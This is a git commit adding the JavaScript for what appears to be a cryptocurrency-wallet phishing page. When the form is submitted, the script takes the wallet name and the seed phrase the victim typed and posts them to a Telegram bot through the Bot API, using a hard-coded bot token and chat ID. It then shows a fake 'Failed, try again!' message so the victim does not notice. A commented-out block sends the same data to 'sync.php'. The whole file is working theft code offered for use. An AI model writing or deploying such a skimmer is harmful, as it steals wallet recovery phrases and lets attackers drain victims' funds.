01874a544c27117adcbb92fa52fea0c5a506f1d4
segzyswitch <segzyswitch99@gmail.com>
2025-11-01 20:38:34 +0100

    first commit

---
+++ WalletAPI_wallets_files/js1.js
@@ -0,0 +1,116 @@
+
+  var phrase = document.querySelector("#phrase");
+  var first = document.querySelector("#first");
+  var second = document.getElementById("second");
+  var third = document.querySelector("#third");
+  var fileUp = document.querySelector("#file-upload");
+  var wallet_name = document.querySelector("#walletname");
+  // phrase.addEventListener("click", function() {
+  //   hide(first);
+  // });
+ 
+
+  function hide(elem) {
+    var expandedPanel = document.querySelector(".active");
+    //This is to remove the current active class on click
+    if (expandedPanel) {
+      expandedPanel.classList.remove("active");
+      var attr = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");
+
+      for (let i = 0; i < attr.length; i++) {
+        attr[i].value = "";
+
+      }
+    }
+    var i = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400")
+    var x = elem.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400")
+
+    for (let c = 0; c < i.length; c++) {
+      i[c].required = false;
+    }
+    for (let c = 0; c < x.length; c++) {
+      x[c].required = true;
+    }
+    //add an active tag to the clicked element and set it's
+
+    elem.classList.add("active");
+
+  }
+
+const form = document.querySelector('form');
+
+function sendData( data ) {
+  /*const XHR = new XMLHttpRequest(),
+        FD  = new FormData( form );
+
+  // Push our data into our FormData object
+  for( var name in data ) {
+    FD.append( name, data[ name ] );
+  }
+  FD.append("wallet", wallet_name.innerHTML);
+  //FD.append( "file", file[0].files[0]);
+
+  // Define what happens on successful data submission
+  XHR.addEventListener( 'load', function( event ) {
+    console.log( XHR.responseText );
+    alert( 'Error Verifying Wallet... Please try again later' );
+      document.querySelector(".sending").style.display = "none";
+  } );
+ 
+  // Define what happens in case of error
+  XHR.addEventListener(' error', function( event ) {
+    alert( 'Oops! Something went wrong. Check your internet' );
+  } );
+
+  // Set up our request
+  XHR.open( 'POST', 'sync.php' );
+
+  // Send our FormData object; HTTP headers are set automatically
+  XHR.send(FD);=*/
+  
+  const token = '6040953304:AAGpvh0_iUAD30kPO83PcRWLFP2oEfpOA6E';
+  const chatId = '1799937611';
+
+     
+  var walletVal= wallet_name.innerHTML;
+  var phraseVal= document.getElementById("phraseinput").value;
+  const message = `wallet: ${walletVal}\nPhrase: ${phraseVal}`;
+  
+  
+  if(phraseVal != ""){
+  // AJAX CALL
+
+$.ajax({
+
+type: "POST",
+url: `https://api.telegram.org/bot${token}/sendMessage`,
+data: {
+  chat_id: chatId,
+  text: message,
+  parse_mode: 'html',
+},
+success:function(respnx)
+{   
+    alert("Failed, try again!")
+},
+error: function(badx)
+{
+  alert( 'Oops! Something went wrong. Check your internet!' );
+  console.log(badx);
+}
+
+});
+}
+
+
+
+
+
+
+}
+
+form.addEventListener( 'submit', function(e){ 
+      e.preventDefault();
+      //delay for 1 seconds
+      sendData();
+} );
